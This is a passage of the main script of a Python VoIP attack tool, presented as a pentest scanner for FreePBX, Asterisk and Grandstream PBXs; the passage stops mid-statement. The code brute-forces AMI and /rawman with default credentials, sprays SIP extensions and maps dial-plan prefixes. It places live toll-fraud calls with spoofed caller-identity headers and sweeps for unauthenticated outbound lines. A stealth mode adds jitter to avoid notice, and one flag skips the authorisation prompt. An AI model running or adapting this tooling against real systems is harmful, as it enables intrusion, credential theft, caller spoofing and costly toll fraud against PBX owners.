#!/usr/bin/env python3.12
"""voip_scan.py — VoIP penetration testing scanner.

Tuned for FreePBX / Asterisk / Grandstream / 3CX engagements on internet-
facing targets. One CLI, one HTML report, one job: prove the toll-fraud risk.

ONE-CLICK FULL AUDIT (--auto):
  voip_scan.py --target <IP> --auto --call-to <YOUR_NUMBER> --i-have-authorization

STANDARD FULL AUDIT:
  voip_scan.py --target <IP> --full --call-test --call-to <YOUR_NUMBER>

USE ONLY ON SYSTEMS YOU OWN OR ARE EXPLICITLY AUTHORISED TO TEST.
"""
from __future__ import annotations

import argparse
import getpass
import os
import random
import re
import socket
import subprocess
import sys
import time
from dataclasses import asdict

from scanner import ami, auth, call, discovery, enumeration, http_probes, report
from scanner.utils import Colours, Progress, TrafficLog, hash_file

try:
    from scanner import cve as cve_module
    _CVE_AVAILABLE = True
except ImportError:
    cve_module = None  # type: ignore[assignment]
    _CVE_AVAILABLE = False

# Mode preset definitions
_MODE_PRESETS: dict[str, dict] = {
    "fast": {
        "rate": 100.0, "timeout": 1.5, "workers": 64,
        "desc": "aggressive speed (rate=100, timeout=1.5s, workers=64)",
    },
    "standard": {
        "rate": 50.0, "timeout": 3.0, "workers": 32,
        "desc": "balanced defaults (rate=50, timeout=3s, workers=32)",
    },
    "stealth": {
        "rate": 5.0, "timeout": 5.0, "workers": 4,
        "desc": "low-and-slow (rate=5, timeout=5s, workers=4)",
    },
}

BANNER = r"""
  __      __   ___ ____    ____
  \ \    / /__|_ _|  _ \  / ___|  ___ __ _ _ __  _ __   ___ _ __
   \ \  / / _ \| || |_) | \___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
    \ \/ / (_) | ||  __/   ___) | (_| (_| | | | | | | |  __/ |
     \__/ \___/___|_|     |____/ \___\__,_|_| |_|_| |_|\___|_|

  v4.0 — FreePBX / Asterisk / Grandstream / 3CX  |  Elite Auto-Mode
"""

# ---------------------------------------------------------------------------
# Terminal helpers (all accept a Colours instance; safe when col.* == "")
# ---------------------------------------------------------------------------

def _phase(label: str, col: Colours) -> None:
    w = 62
    print(f"\n{col.BOLD}{col.CYAN}{'─' * w}")
    print(f"  {label}")
    print(f"{'─' * w}{col.RESET}")


def _ok(msg: str, col: Colours) -> None:
    print(f"  {col.GREEN}[+]{col.RESET} {msg}")


def _warn(msg: str, col: Colours) -> None:
    print(f"  {col.YELLOW}[!]{col.RESET} {msg}")


def _info(msg: str, col: Colours) -> None:
    print(f"  {col.CYAN}[*]{col.RESET} {msg}")


def _err(msg: str, col: Colours) -> None:
    print(f"  {col.RED}[X]{col.RESET} {msg}")


def _finding(sev: str, msg: str, col: Colours) -> None:
    tag = f"[{sev.upper():8}]"
    print(f"  {col.for_severity(sev)}{tag}{col.RESET} {msg}")


def _jitter_sleep(jitter: float) -> None:
    """Sleep for a random duration between 0 and jitter seconds."""
    if jitter > 0.0:
        time.sleep(random.uniform(0.0, jitter))


# ---------------------------------------------------------------------------
# Authorisation gate
# ---------------------------------------------------------------------------

def authorize(args, col: Colours) -> tuple[str, str | None]:
    """Returns (operator, scope_sha256 or None). Exits on refusal."""
    operator = args.operator or getpass.getuser()

    scope_hash = None
    if args.scope_file:
        if not os.path.exists(args.scope_file):
            print(f"ERROR: scope file not found: {args.scope_file}", file=sys.stderr)
            sys.exit(2)
        scope_hash = hash_file(args.scope_file)

    intrusive = any([args.enum, args.spray, args.call_test, args.full, args.ami_attack,
                     getattr(args, "auto", False)])
    if intrusive and not args.scope_file:
        if not args.i_have_authorization:
            print()
            print(f"{col.BOLD}AUTHORISATION REQUIRED{col.RESET}")
            print("─" * 60)
            print(f"  Operator       : {operator}")
            print(f"  Target         : {args.target}")
            print(f"  Scope file     : (none provided)")
            print(f"  Intrusive tests: {intrusive}")
            if args.call_test:
                print(f"  {col.RED}CALL PLACEMENT{col.RESET} : YES → {args.call_to} from {args.call_from or 'auto'}")
            print()
            print("I confirm I am authorised by the asset owner to perform this test,")
            print("and accept full responsibility for any impact to the target.")
            ans = input("Type 'yes' to proceed: ").strip().lower()
            if ans != "yes":
                print("Aborted.")
                sys.exit(1)

    return operator, scope_hash


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description=(
            "VoIP pentest scanner — full PBX audit in one command.\n"
            "Discovers, enumerates, cracks, and demonstrates toll-fraud on\n"
            "FreePBX / Asterisk / Grandstream internet-facing targets."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "ONE-CLICK FULL AUDIT:\n"
            "  %(prog)s --target 10.0.0.1 --auto --call-to +447900900900 --i-have-authorization\n\n"
            "Checks run with --auto / --full:\n"
            "  discovery · HTTP probes · CVE scan · AMI brute-force · Asterisk HTTP API\n"
            "  extension enumeration · credential spray · SRTP downgrade\n"
            "  CVE-2021-37748 (Grandstream) · FreePBX REST API · rawman\n\n"
            "Add --call-test --call-to <number> to demonstrate live toll fraud."
        ),
    )
    p.add_argument("--target", default="",
                   help="IP, CIDR, hostname, or file:hosts.txt")
    p.add_argument("--operator",
                   help="Name/handle of the operator (defaults to $USER)")
    p.add_argument("--scope-file",
                   help="Path to signed scope-of-work; SHA-256 logged")
    p.add_argument("--i-have-authorization", action="store_true",
                   help="Skip interactive auth prompt (still requires scope-file for record)")

    p.add_argument("--auto", action="store_true",
                   help="One-command full audit: enables --full + CVE scan + stealth "
                        "mode + STUN + AMI + prefix discovery. The most comprehensive "
                        "single flag. Add --call-to to also demonstrate live toll fraud. "
                        "Requires --i-have-authorization.")

    g = p.add_argument_group("Checks (default: discover only)")
    g.add_argument("--full", action="store_true",
                   help="Run all checks: enum + spray + ami-attack + HTTP probes + "
                        "CVE scan + Asterisk HTTP API. Automatically enables --stun "
                        "auto and --discover-prefix when --call-to is provided. "
                        "Alias for --auto.")
    g.add_argument("--enum", action="store_true",
                   help="Enumerate extensions via REGISTER+INVITE")
    g.add_argument("--ext-range",
                   help="Extension range: 1000-1099 | 100,200 | file:path "
                        "(auto-detected from fingerprint when --full)")
    g.add_argument("--ext-wordlist",
                   default=os.path.join(os.path.dirname(__file__),
                                        "wordlists/extensions.txt"))
    g.add_argument("--spray", action="store_true",
                   help="Spray default credentials against auth-required extensions")
    g.add_argument("--cred-file",
                   default=os.path.join(os.path.dirname(__file__),
                                        "wordlists/credentials.txt"))
    g.add_argument("--grandstream-creds", action="store_true",
                   help="Also try the Grandstream-specific credential list")
    g.add_argument("--ami-attack", action="store_true",
                   help="Brute-force AMI (TCP/5038) and Asterisk HTTP API with default credentials")

    c = p.add_argument_group("Toll-fraud call PoC")
    c.add_argument("--call-test", action="store_true",
                   help="Place a proof-of-concept outbound call")
    c.add_argument("--call-to",
                   help="Destination number (YOU must own it)")
    c.add_argument("--call-from",
                   help="From extension (defaults to first valid extension found)")
    c.add_argument("--call-dry-run", action="store_true",
                   help="Stop at provisional response (no 200 OK)")
    c.add_argument("--from-display",
                   help='Display name on From: header (e.g. "Unknown")')
    c.add_argument("--pai",
                   help="P-Asserted-Identity (e.g. sip:+14155550100@example.com)")
    c.add_argument("--diversion",
                   help="Diversion header (spoofed forward history)")
    c.add_argument("--privacy",
                   help="Privacy header — id|header|session|user|none|critical")
    c.add_argument("--remote-party-id",
                   help="Remote-Party-ID header (Cisco/legacy equivalent of PAI)")
    c.add_argument("--srtp", choices=["off", "offer", "require"], default="off",
                   help="Media-plane SRTP policy")
    c.add_argument("--call-duration", type=float, default=60.0, metavar="SECS",
                   help="Seconds to hold the call before sending BYE (default 60)")
    c.add_argument("--call-dtmf",
                   help='DTMF sequence after answer (e.g. "1p500#"; pN = N-ms pause)')
    c.add_argument("--discover-prefix", action="store_true",
                   help="Auto-discover dial-plan prefix (9, 0, +, etc.) before full call test. "
                        "Enabled automatically with --full when --call-to is set.")
    c.add_argument("--call-to-auto", action="store_true",
                   help="Use the AMI-discovered first extension as the from-number and try "
                        "a call to --call-to to show dialplan routing. "
                        "Requires --call-to for the actual destination number.")

    t = p.add_argument_group("Tuning")
    t.add_argument("--mode", choices=["fast", "standard", "stealth"],
                   default="standard",
                   help="Preset: fast (aggressive), standard (default), stealth (low-and-slow). "
                        "Overridden by explicit --rate/--timeout/--workers.")
    t.add_argument("--rate", type=float, default=None,
                   help="Max requests per second (default: from --mode)")
    t.add_argument("--timeout", type=float, default=None,
                   help="Socket timeout in seconds (default: from --mode)")
    t.add_argument("--workers", type=int, default=None,
                   help="Parallel workers for sweeps (default: from --mode)")
    t.add_argument("--jitter", type=float, default=None,
                   help="Random per-request sleep: 0 to JITTER seconds. "
                        "Default: 0.0 for fast/standard, 0.15 for stealth. "
                        "In stealth mode, a minimum of 0.05s jitter is always applied.")
    t.add_argument("--port", type=int, default=5060,
                   help="SIP port (default 5060)")
    t.add_argument("--ami-port", type=int, default=5038,
                   help="AMI port (default 5038)")
    t.add_argument("--http-attack-port", type=int, default=8088,
                   help="Asterisk HTTP API port (default 8088)")
    t.add_argument("--source-ip", default="",
                   help="Bind local sockets to this IP (for multi-NIC hosts)")
    t.add_argument("--network", default="",
                   help="Select outbound network interface by index (0, 1, …) or name "
                        "(e.g. en0, eth0). Run with --list-networks to see available "
                        "interfaces. Sets --source-ip automatically.")
    t.add_argument("--stun",
                   help="Resolve public IP via STUN before scan. "
                        "Use '--stun auto' to try well-known public STUN servers, "
                        "or '--stun host[:port]' for a specific server. "
                        "Enabled automatically with --full.")
    t.add_argument("--source-port-range",
                   help="Bind within port range, inclusive (e.g. '5060-5099')")
    t.add_argument("--max-failures-per-ext", type=int, default=5,
                   help="Stop spraying an extension after N failed attempts (default 5)")

    o = p.add_argument_group("Output")
    o.add_argument("--report-dir",
                   help="Directory for report.html and report.json (default reports/<timestamp>)")
    o.add_argument("--no-color", action="store_true",
                   help="Disable ANSI colour output")
    o.add_argument("--list-networks", action="store_true",
                   help="Print available network interfaces and exit (use with --network)")

    return p.parse_args()


def _parse_port_range(spec: str | None) -> tuple[int, int] | None:
    if not spec:
        return None
    try:
        lo_s, hi_s = spec.split("-", 1)
        lo, hi = int(lo_s), int(hi_s)
    except ValueError:
        raise SystemExit(f"ERROR: --source-port-range must be 'low-high', got {spec!r}")
    if not (1 <= lo <= hi <= 65535):
        raise SystemExit(f"ERROR: --source-port-range out of bounds: {spec}")
    return (lo, hi)


def _list_interfaces() -> list[tuple[str, str]]:
    """Return [(name, ipv4), ...] for non-loopback IPv4 interfaces."""
    try:
        import netifaces  # type: ignore[import]
        result = []
        for name in netifaces.interfaces():
            for addr in netifaces.ifaddresses(name).get(netifaces.AF_INET, []):
                ip = addr.get("addr", "")
                if ip and not ip.startswith("127."):
                    result.append((name, ip))
        return result
    except ImportError:
        pass

    # stdlib fallback: ifconfig (macOS/BSD) or ip addr (Linux)
    try:
        if sys.platform == "darwin":
            raw = subprocess.check_output(["ifconfig"], text=True, stderr=subprocess.DEVNULL)
            ifaces, current = [], None
            for line in raw.splitlines():
                m = re.match(r'^(\S+):', line)
                if m:
                    current = m.group(1)
                elif current:
                    m = re.match(r'\s+inet (\d+\.\d+\.\d+\.\d+)', line)
                    if m and not m.group(1).startswith("127."):
                        ifaces.append((current, m.group(1)))
            return ifaces
        else:
            raw = subprocess.check_output(["ip", "-4", "addr"], text=True, stderr=subprocess.DEVNULL)
            ifaces, current = [], None
            for line in raw.splitlines():
                m = re.match(r'^\d+: (\S+?)[@:]', line)
                if m:
                    current = m.group(1)
                elif current:
                    m = re.match(r'\s+inet (\d+\.\d+\.\d+\.\d+)', line)
                    if m and not m.group(1).startswith("127."):
                        ifaces.append((current, m.group(1)))
            return ifaces
    except Exception:
        return []


def _resolve_network_arg(value: str) -> str:
    """Resolve --network INDEX-or-NAME to an IPv4 address string."""
    ifaces = _list_interfaces()
    if not ifaces:
        raise SystemExit("ERROR: --network: could not enumerate network interfaces. "
                         "Use --source-ip directly.")
    # Try numeric index
    if re.fullmatch(r'\d+', value):
        idx = int(value)
        if idx >= len(ifaces):
            lines = "\n".join(f"  {i}: {n}  {ip}" for i, (n, ip) in enumerate(ifaces))
            raise SystemExit(f"ERROR: --network {idx} out of range. Available:\n{lines}")
        return ifaces[idx][1]
    # Try interface name
    for name, ip in ifaces:
        if name == value:
            return ip
    lines = "\n".join(f"  {i}: {n}  {ip}" for i, (n, ip) in enumerate(ifaces))
    raise SystemExit(f"ERROR: --network {value!r} not found. Available:\n{lines}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    print(BANNER)
    args = parse_args()

    col = Colours(force=False if args.no_color else None)

    # --list-networks: print interfaces and exit (no --target needed)
    if args.list_networks:
        ifaces = _list_interfaces()
        if not ifaces:
            print("No non-loopback IPv4 interfaces found.")
        else:
            print("Available network interfaces:")
            for i, (name, ip) in enumerate(ifaces):
                print(f"  {i}: {name:<12}  {ip}")
            print("\nUse:  --network 0   or   --network en0")
        return 0

    if not args.target:
        print("ERROR: --target is required", file=sys.stderr)
        return 2

    # --network resolves to --source-ip; explicit --source-ip takes precedence
    if args.network and not args.source_ip:
        args.source_ip = _resolve_network_arg(args.network)
        _info(f"Network {args.network!r} → source IP {args.source_ip}", col)
    elif args.network and args.source_ip:
        _warn("Both --network and --source-ip given; --source-ip takes precedence", col)

    # --full is an alias for --auto (backwards compat)
    if args.full and not args.auto:
        args.auto = True

    # --auto: one-command maximum-depth audit
    if args.auto:
        args.full = True
        args.ami_attack = True
        if args.mode == "standard":
            args.mode = "stealth"
        if not args.stun:
            args.stun = "auto"
        if not args.discover_prefix:
            args.discover_prefix = True
        # Auto-enable call test when --call-to is provided
        if args.call_to and not args.call_test:
            args.call_test = True
        if not args.i_have_authorization:
            _err("--auto requires --i-have-authorization", col)
            return 2
        _info("AUTO mode — hyper-intelligent scan, all checks enabled", col)

    # --full expands into constituent checks
    if args.full:
        args.enum = True
        args.spray = True
        args.ami_attack = True
        # Auto-enable STUN and prefix discovery in full mode
        if not args.stun:
            args.stun = "auto"
        if args.call_to and not args.discover_prefix:
            args.discover_prefix = True

    # Apply mode preset; explicit flags win
    preset = _MODE_PRESETS[args.mode]
    if args.rate is None:
        args.rate = preset["rate"]
    if args.timeout is None:
        args.timeout = preset["timeout"]
    if args.workers is None:
        args.workers = preset["workers"]

    # Jitter: apply defaults based on mode, then enforce stealth minimum
    if args.jitter is None:
        if args.mode == "stealth":
            args.jitter = 0.15
        else:
            args.jitter = 0.0
    elif args.mode == "stealth":
        # Stealth mode enforces a minimum of 0.05s jitter
        args.jitter = max(args.jitter, 0.05)

    _info(f"Mode: {col.BOLD}{args.mode}{col.RESET} — {preset['desc']}", col)
    if args.jitter > 0.0:
        _info(f"Jitter: {args.jitter:.2f}s per-request random sleep enabled", col)

    if args.call_test and not args.call_to:
        _err("--call-test requires --call-to (a number YOU control)", col)
        return 2

    if args.call_to_auto and not args.call_to:
        _err("--call-to-auto requires --call-to (destination number)", col)
        return 2

    source_port_range = _parse_port_range(args.source_port_range)

    # ---- STUN: resolve public IP to fix Via/Contact headers behind NAT ----
    if args.stun:
        from scanner.stun import resolve_public_ip
        stun_arg = None if args.stun.lower() == "auto" else args.stun
        _info("Resolving public IP via STUN...", col)
        public_ip = resolve_public_ip(stun_server=stun_arg, timeout=args.timeout)
        if public_ip:
            _ok(f"Public IP (reflexive): {col.BOLD}{public_ip}{col.RESET} — patched into SIP Via/Contact", col)
            if not args.source_ip:
                args.source_ip = public_ip
        else:
            _warn("STUN lookup failed — continuing with local IP (may fail behind NAT)", col)

    operator, scope_sha = authorize(args, col)

    stamp = time.strftime("%Y%m%d-%H%M%S")
    report_dir = args.report_dir or os.path.join("reports", stamp)
    os.makedirs(report_dir, exist_ok=True)
    traffic_log = TrafficLog(os.path.join(report_dir, "traffic.log"))

    # ══════════════════════════════════════════════════════════════════════
    _phase("PHASE 1 · DISCOVERY", col)

    targets = discovery.expand_target(args.target)
    if not targets:
        _err(f"Could not resolve target: {args.target}", col)
        return 2

    _info(f"Scanning {len(targets)} host(s) for VoIP services...", col)
    extra_udp = [args.port] if args.port != 5060 else None
    hosts = discovery.sweep(
        targets, timeout=args.timeout, rate_per_second=args.rate,
        workers=args.workers, traffic_log=traffic_log,
        extra_udp_ports=extra_udp,
        source_ip=args.source_ip,
    )

    if not hosts:
        _warn("No VoIP services discovered.", col)
    else:
        _ok(f"{len(hosts)} host(s) responded:", col)
        for h in hosts:
            ports_str = " ".join(f"{p['port']}/{p['proto']}" for p in h.open_ports)
            ver_str = ("  v:" + (getattr(h, "version", "") or "?")) if getattr(h, "version", "") else ""
            _ok(f"  {col.BOLD}{h.ip}{col.RESET}  [{h.fingerprint}]{ver_str}  {ports_str}", col)

    host_reports: list[dict] = []

    for h in hosts:
        hr: dict = {
            "ip": h.ip,
            "open_ports": h.open_ports,
            "sip": h.sip,
            "fingerprint": h.fingerprint,
            "extensions": [],
            "credentials_found": [],
            "http_findings": [],
            "cve_findings": [],
            "ami": None,
            "ami_http": None,
            "call_test": None,
        }

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 2 · HTTP PROBES  [{h.ip}]", col)

        tcp_ports = sorted({p["port"] for p in h.open_ports if p["proto"] == "tcp"})
        if tcp_ports:
            _jitter_sleep(args.jitter)
            findings = http_probes.run_all(h.ip, tcp_ports, timeout=args.timeout)
            hr["http_findings"] = [
                {"name": f.name, "severity": f.severity, "target": f.target,
                 "title": f.title, "evidence": f.evidence,
                 "remediation": f.remediation}
                for f in findings
            ]
            if findings:
                for f in findings:
                    _finding(f.severity, f"{f.target} — {f.title}", col)
            else:
                _info("No HTTP admin surfaces found on open TCP ports.", col)
        else:
            _info("No TCP ports open — skipping HTTP probes.", col)

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 2b · CVE / VULNERABILITY SCAN  [{h.ip}]", col)

        sip_info = h.sip or {}
        sip_transport = sip_info.get("transport", "udp")
        sip_tcp = sip_transport in ("tcp", "tls")
        sip_tls = sip_transport == "tls"
        sip_port = args.port

        sip_server_banner = sip_info.get("server", "")

        if _CVE_AVAILABLE:
            _jitter_sleep(args.jitter)
            cve_results = cve_module.check_all(
                h.ip,
                tcp_ports=tcp_ports,
                fingerprint=h.fingerprint,
                sip_server=sip_server_banner,
                sip_port=sip_port,
                timeout=args.timeout,
            )
            hr["cve_findings"] = [
                {
                    "cve_id": r.cve_id, "platform": r.platform,
                    "severity": r.severity, "host": r.host, "port": r.port,
                    "title": r.title, "evidence": r.evidence,
                    "remediation": r.remediation,
                    "affected_version": r.affected_version,
                }
                for r in cve_results
            ]
            if cve_results:
                for r in cve_results:
                    _finding(r.severity, f"{r.cve_id} — {r.title}", col)
            else:
                _info("No CVE/config findings on this host.", col)
        else:
            _warn("CVE module not available — skipping CVE scan.", col)

        if h.sip:
            sip_srv = h.sip.get("server", "")
            _ok(f"SIP/{sip_transport.upper()}: {h.sip.get('status')} {h.sip.get('reason')}  "
                f"server={col.BOLD}{sip_srv or '(hidden)'}{col.RESET}  "
                f"fingerprint={col.CYAN}{h.fingerprint}{col.RESET}", col)
        else:
            _warn(f"{h.ip}: no SIP response on UDP/TCP — SIP phases will be skipped.", col)

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 3 · AMI / MANAGEMENT ATTACK  [{h.ip}]", col)

        if args.ami_attack:
            # TCP AMI (port 5038)
            ami_open = any(p["service"] == "Asterisk-AMI" for p in h.open_ports)
            if ami_open:
                _info(f"Trying AMI default credentials on TCP/{args.ami_port}...", col)
                _jitter_sleep(args.jitter)
                ami_res = ami.attack(h.ip, port=args.ami_port,
                                     timeout=args.timeout,
                                     traffic_log=traffic_log)
                hr["ami"] = asdict(ami_res)
                if ami_res.success:
                    _finding("critical",
                             f"AMI pwned: {col.BOLD}{ami_res.username}/{ami_res.password}{col.RESET}  "
                             f"({len(ami_res.extensions)} extensions, "
                             f"{len(ami_res.voicemail_boxes)} voicemail boxes dumped)",
                             col)

                    # Phase 3 bonus: try AMI originate as an alternative toll-fraud PoC
                    if args.call_test and args.call_to:
                        # Determine from-extension: prefer first AMI-dumped ext
                        ami_exts = ami_res.extensions or []
                        originate_from = args.call_from or (ami_exts[0] if ami_exts else "1000")
                        _info(
                            f"AMI originate PoC: {col.BOLD}{originate_from}{col.RESET} → "
                            f"{col.BOLD}{args.call_to}{col.RESET}",
                            col,
                        )
                        _jitter_sleep(args.jitter)
                        try:
                            originate_result = ami.originate_call(
                                h.ip,
                                port=args.ami_port,
                                username=ami_res.username,
                                password=ami_res.password,
                                call_from=originate_from,
                                call_to=args.call_to,
                                timeout=args.timeout,
                                dry_run=args.call_dry_run,
                            )
                            if originate_result and getattr(originate_result, "success", False):
                                _finding(
                                    "critical",
                                    f"AMI ORIGINATE toll fraud confirmed — call to "
                                    f"{args.call_to} placed via AMI",
                                    col,
                                )
                                if hr["call_test"] is None:
                                    hr["call_test"] = {
                                        "call_to": args.call_to,
                                        "call_from": originate_from,
                                        "success": True,
                                        "reached_dialplan": True,
                                        "status_code": "AMI",
                                        "reason": "Originate via AMI",
                                        "evidence": getattr(originate_result, "evidence", ""),
                                        "trace": "",
                                        "srtp_state": "off",
                                        "dtmf_digits_sent": "",
                                    }
                            else:
                                _info("AMI originate: call not confirmed (may need dialplan check).", col)
                        except AttributeError:
                            _info("ami.originate_call() not available in this build — skipping.", col)

                elif ami_res.reachable:
                    _warn(f"AMI reachable but no default creds matched.", col)
                else:
                    _info("AMI port not reachable.", col)

            # Asterisk HTTP rawman API (port 8088)
            http_attack_port = args.http_attack_port
            _info(f"Trying Asterisk HTTP /rawman on port {http_attack_port}...", col)
            _jitter_sleep(args.jitter)
            ami_http_res = ami.attack_asterisk_http(
                h.ip, port=http_attack_port, timeout=args.timeout
            )
            hr["ami_http"] = asdict(ami_http_res)
            if ami_http_res.success:
                _finding("critical",
                         f"Asterisk HTTP /rawman authenticated: "
                         f"{col.BOLD}{ami_http_res.username}/{ami_http_res.password}{col.RESET}",
                         col)
            elif ami_http_res.reachable:
                _warn(f"Asterisk HTTP /rawman reachable but no default creds matched.", col)
            else:
                _info("Asterisk HTTP API not found on this host.", col)

        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 4 · TOLL-FRAUD CALL POC  [{h.ip}]", col)

        if not h.sip:
            _warn(f"{h.ip}: no SIP response — skipping extension enumeration, spray, and call PoC.", col)
            host_reports.append(hr)
            continue

        # --auto with no --call-to but creds found: hint the operator
        if args.auto and not args.call_to and hr["credentials_found"]:
            _warn("  [!] Add --call-to <YOUR_NUMBER> to demonstrate live toll fraud", col)

        if args.call_test:
            call_from = args.call_from
            username = password = None

            # Build ordered candidate list: cracked creds first, then anonymous/open exts
            _call_candidates: list[tuple[str, str | None, str | None]] = []
            for _c in hr["credentials_found"]:
                _call_candidates.append((_c["extension"], _c["username"], _c["password"]))
            if hr["extensions"]:
                _openish = [e for e in hr["extensions"]
                            if e.get("anonymous_invite") or e.get("open_register")]
                for _e in _openish:
                    _call_candidates.append((_e["extension"], None, None))
                if _openish and args.auto:
                    _info("AUTO mode: anonymous INVITE accepted — toll-fraud vector confirmed.", col)

            _anonymous_dialout_probe = False
            if _call_candidates:
                _best = _call_candidates[0]
                call_from = call_from or _best[0]
                username, password = _best[1], _best[2]
                _auth_label = f"{username}/{password}" if username else "anonymous"
                _info(f"Primary calling extension: {col.BOLD}{call_from}{col.RESET}  [{_auth_label}]", col)
            else:
                # No discovered or cracked extensions — probe for anonymous dial-out:
                # does the PBX route PSTN calls from a completely unknown, unauthenticated
                # SIP endpoint? This is the most dangerous misconfiguration possible.
                call_from = call_from or "1000"
                _anonymous_dialout_probe = True
                _warn(
                    f"{col.RED}ANONYMOUS DIAL-OUT PROBE{col.RESET}: no extensions found/cracked — "
                    f"testing whether PBX routes PSTN calls from a completely unknown, "
                    f"unauthenticated SIP endpoint (ext {col.BOLD}{call_from}{col.RESET}, no credentials)",
                    col,
                )

            # --call-to-auto: override call_from with first AMI-discovered extension
            if args.call_to_auto:
                ami_exts_for_auto = (hr.get("ami") or {}).get("extensions") or []
                if ami_exts_for_auto:
                    auto_from = ami_exts_for_auto[0]
                    _info(
                        f"--call-to-auto: using AMI-discovered extension "
                        f"{col.BOLD}{auto_from}{col.RESET} as from-number for dialplan routing test.",
                        col,
                    )
                    call_from = auto_from
                else:
                    _warn("--call-to-auto: no AMI-discovered extensions available; using default.", col)

            # Dial-plan prefix discovery — tries every candidate extension until a
            # prefix is found; in --auto mode also maps ALL working prefixes exhaustively
            effective_call_to = args.call_to
            all_working_prefixes: list[tuple[str, str, str]] = []  # (prefix, dest, from_ext)

            if args.discover_prefix:
                _platform_prefixes = call.prefixes_for_fingerprint(h.fingerprint)
                _info(
                    f"Prefix discovery: probing {len(_platform_prefixes)} prefixes "
                    f"({h.fingerprint} order) across "
                    f"{min(len(_call_candidates) or 1, 3)} extension(s)...",
                    col,
                )

                _found_prefix: str | None = None
                _probe_exts = _call_candidates[:3] if _call_candidates else [(call_from, username, password)]

                for _ext, _uname, _pwd in _probe_exts:
                    _jitter_sleep(args.jitter)

                    if args.auto:
                        # Exhaustive: find every working prefix from this extension
                        _hits = call.discover_all_prefixes(
                            h.ip, args.call_to, _ext,
                            port=args.port, username=_uname, password=_pwd,
                            timeout=args.timeout, traffic_log=traffic_log,
                            source_ip=args.source_ip,
                            source_port_range=source_port_range,
                            prefixes=_platform_prefixes,
                        )
                        for _pfx, _dest in _hits:
                            all_working_prefixes.append((_pfx, _dest, _ext))
                        if _hits and _found_prefix is None:
                            _found_prefix, effective_call_to = _hits[0]
                            call_from, username, password = _ext, _uname, _pwd
                    else:
                        # Fast: stop at first working prefix
                        _found_prefix, effective_call_to = call.discover_dialplan_prefix(
                            h.ip, args.call_to, _ext,
                            port=args.port, username=_uname, password=_pwd,
                            timeout=args.timeout, traffic_log=traffic_log,
                            source_ip=args.source_ip,
                            source_port_range=source_port_range,
                            prefixes=_platform_prefixes,
                        )
                        if _found_prefix is not None:
                            call_from, username, password = _ext, _uname, _pwd
                            break

                if _found_prefix is not None:
                    _prefix_label = repr(_found_prefix) if _found_prefix else "'(none — direct E.164 routing)'"
                    _ok(f"Dial-plan prefix: {_prefix_label} → {col.BOLD}{effective_call_to}{col.RESET}  "
                        f"via ext {call_from}", col)
                else:
                    _warn(f"No prefix produced a provisional response — using bare {effective_call_to}", col)

                if len(all_working_prefixes) > 1:
                    _info(f"All working prefixes ({len(all_working_prefixes)} found):", col)
                    for _pfx, _dest, _fext in all_working_prefixes:
                        _pfx_disp = repr(_pfx) if _pfx else "'(direct)'"
                        _ok(f"  prefix {_pfx_disp:<12} → {_dest}  from {_fext}", col)
                    _finding("high",
                             f"Multiple outbound prefixes accepted — dialplan not restricted "
                             f"({len(all_working_prefixes)} routes: "
                             f"{', '.join(repr(p) for p, _, _ in all_working_prefixes)})",
                             col)

            _info(f"Placing PoC call: {col.BOLD}{call_from}{col.RESET} → "
                  f"{col.BOLD}{effective_call_to}{col.RESET}  "
                  f"dry_run={args.call_dry_run}  srtp={args.srtp}", col)

            _jitter_sleep(args.jitter)
            result = call.place_call(
                h.ip, effective_call_to, call_from,
                port=args.port,
                username=username, password=password,
                timeout=args.timeout, dry_run=args.call_dry_run,
                call_duration=0.0 if args.call_dry_run else args.call_duration,
                traffic_log=traffic_log,
                pai=args.pai, diversion=args.diversion,
                privacy=args.privacy, remote_party_id=args.remote_party_id,
                from_display=args.from_display,
                source_ip=args.source_ip,
                source_port_range=source_port_range,
                srtp=args.srtp,
                dtmf_digits=args.call_dtmf or "",
            )
            hr["call_test"] = {
                "call_to": effective_call_to, "call_from": call_from,
                "success": result.success,
                "reached_dialplan": result.reached_dialplan,
                "status_code": result.status_code,
                "reason": result.reason,
                "evidence": result.evidence,
                "trace": result.sip_trace,
                "srtp_state": result.srtp_state,
                "dtmf_digits_sent": result.dtmf_digits_sent,
                "anonymous_dialout": _anonymous_dialout_probe,
                "working_prefixes": [
                    {"prefix": p, "destination": d, "from_ext": e}
                    for p, d, e in all_working_prefixes
                ],
            }

            if result.success and _anonymous_dialout_probe:
                _finding("critical",
                         f"ANONYMOUS DIAL-OUT CONFIRMED — PBX routes PSTN calls from ANY "
                         f"unauthenticated SIP endpoint with no extension registration required. "
                         f"Attacker needs only network access to {h.ip}:5060. "
                         f"Extension {call_from} was never registered or authenticated.",
                         col)

                # Weak-line sweep: enumerate which extensions the PBX routes
                # without authentication (every one = a usable toll-fraud launch point).
                # Run dry_run so the destination only gets a brief ring per candidate.
                _wl_numeric = [
                    e for e in enumeration.SPECIAL_EXTENSIONS
                    if e.isdigit() and e != call_from
                ]
                _wl_extra = [str(n) for n in range(1001, 1006)] + \
                            ["100", "200", "300", "400", "500",
                             "2000", "3000", "4000"]
                _wl_cands = list(dict.fromkeys(_wl_numeric[:8] + _wl_extra))
                _wl_cands = [e for e in _wl_cands if e != call_from][:18]

                _info(f"Weak-line sweep: testing {len(_wl_cands)} extensions "
                      f"for unauthenticated outbound routing...", col)
                _weak_lines: list[str] = [call_from]  # already confirmed
                for _wext in _wl_cands:
                    _wr = call.place_call(
                        h.ip, effective_call_to, _wext,
                        port=args.port, timeout=min(args.timeout, 3.0),
                        dry_run=True, max_wait=3.5,
                        traffic_log=traffic_log,
                        source_ip=args.source_ip,
                        source_port_range=source_port_range,
                    )
                    status = _wr.status_code or "timeout"
                    if _wr.reached_dialplan:
                        _weak_lines.append(_wext)
                        _warn(f"  Weak line: ext {col.BOLD}{_wext}{col.RESET} → "
                              f"dialplan accepted  [{status}]", col)
                    else:
                        _info(f"  {_wext}: rejected  [{status}]", col)

                hr["call_test"]["weak_lines"] = _weak_lines
                _warn(f"{col.RED}{col.BOLD}{len(_weak_lines)} weak line(s) confirmed{col.RESET}: "
